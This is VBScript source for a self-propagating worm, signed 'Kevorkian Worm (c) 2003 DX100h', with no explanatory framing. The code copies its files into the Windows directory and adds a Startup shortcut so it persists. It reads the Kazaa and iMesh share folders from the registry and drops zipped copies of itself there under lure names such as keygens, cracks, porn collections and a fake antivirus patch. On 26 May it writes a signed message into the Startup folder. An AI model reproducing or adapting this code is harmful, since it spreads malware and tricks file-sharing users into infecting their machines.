'********[SETTINGS]***********************************
On Error Resume Next
payload="To Die With Dignity"
Set fso = CreateObject("Scripting.FileSystemObject")
Set wss = CreateObject("WScript.Shell")
kazabool=true
imeshbool=true
'*****************************************************

'********[COPYING]************************************
sorgente = "start.exe"
destinazione="c:\windows\"
fso.CopyFile sorgente,destinazione,true
sorgente="data.vbs"
destinazione="c:\windows\data.dat"
fso.CopyFile sorgente,destinazione,true
destinazione="c:\windows\data2.dat"
sorgente="data2.dat"
fso.CopyFile sorgente,destinazione,true
'*****************************************************

'********[AUTO]***************************************
strPath =wss.SpecialFolders("Startup")
Set objShortcut = wss.CreateShortcut(strPath & "\Winboot.lnk")
strAcc ="c:\windows\"
objShortcut.TargetPath = strAcc & "start.exe"
objShortcut.WorkingDirectory = "c:\windows\"
objShortcut.WindowStyle = 4
objShortcut.Save
'*****************************************************

'********[P2PCHECK]***********************************
kazadir = wss.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Kazaa\CloudLoad\ShareDir")
imeshdir = wss.regread("HKEY_LOCAL_MACHINE\SOFTWARE\iMesh\Client\DownloadsLocation")
If imeshdir="" Then 
        imeshbool=false
End If
If kazadir="" Then 
        kazabool=false
End If
'*****************************************************

If kazabool=true or imeshbool=true then
        sorgente = "data2.dat"
        destinazione ="zip.exe"
        fso.CopyFile sorgente,destinazione,true
        sorgente = "data.vbs"
        destinazione= "data.dat"
        fso.CopyFile sorgente,destinazione,true
        randomize
        valore=int((10*Rnd)+1)
        If valore=1 Then 
                nomeintero="Jenna_Jameson_pictures_collection.zip"
        End If
        If valore=2 Then
                mese=month(now)
                giorno=day(now)
                anno=year(now)
                data=mese&"-"&giorno&"-"&anno&"-" 
                nomeintero=data&"Updated_porn_sites_passwords.zip"
        End If
        If valore=3 Then 
                nomeintero="Rollercoaster_tycoon2_no_cd-Crack.zip"
        End If
        If valore=4 Then 
                nomeintero="Super_Taboo_Hentai_volume1.zip"
        End If
        If valore=5 Then 
                nomeintero="Generatore_di_Codici_Fiscali.zip"
        End If
        If valore=6 Then 
                nomeintero="Credit_Card_Generator.zip"
        End If
        If valore=7 Then 
                nomeintero="Guide_to_Hacking_by_Dr.Who.zip"
        End If
        If valore=8 Then
                mese=month(now)
                giorno=day(now)
                anno=year(now)
                data=mese&"-"&giorno&"-"&anno&"-"       
                nomeintero="Antiviral_Toolkit_Pro_"&data&"patch.zip"
        End If
        If valore=9 Then 
                nomeintero="101_lockpicking_methods.zip"
        End If
        If valore=10 Then 
                nomeintero="Neverwinter_Nights_Keygen.zip"
        End If
        wss.run "zip.exe -add "&nomeintero&" data.dat data2.dat start.exe",0,true
        'msgbox "Unable to run execution script"
        fso.DeleteFile "data.dat",true
        fso.DeleteFile "zip.exe",true
        if kazabool=true then
                sorgente=nomeintero
                destinazione=kazadir&"\"&nomeintero
                fso.CopyFile sorgente,destinazione,true
        end if
        if imeshbool=true then
                sorgente=nomeintero
                destinazione=imeshdir&"\"&nomeintero
                fso.CopyFile sorgente,destinazione,true
        end if
        fso.DeleteFile nomeintero,true
        
End If

If day(now)=26 and month(now)=5 Then
        strPath =wss.SpecialFolders("Startup")
        set payload=fso.OpenTextFile(strPath&"\readme.txt",2,true,0)
        payload.write "To Die With Dignity... thanks for your attention"+chr(10)+chr(13)
        payload.write ""+chr(10)+chr(13)
        payload.write "Kevorkian Worm (c) 2003 DX100h"+chr(10)+chr(13)
        payload.write "Greetings to: Necronomikon, slagehammer, Gigabyte, Spo0ky, -opic, spa"+chr(10)+chr(13)
        payload.write "Thanks for having spread me"+chr(10)+chr(13)
        payload.close
End if

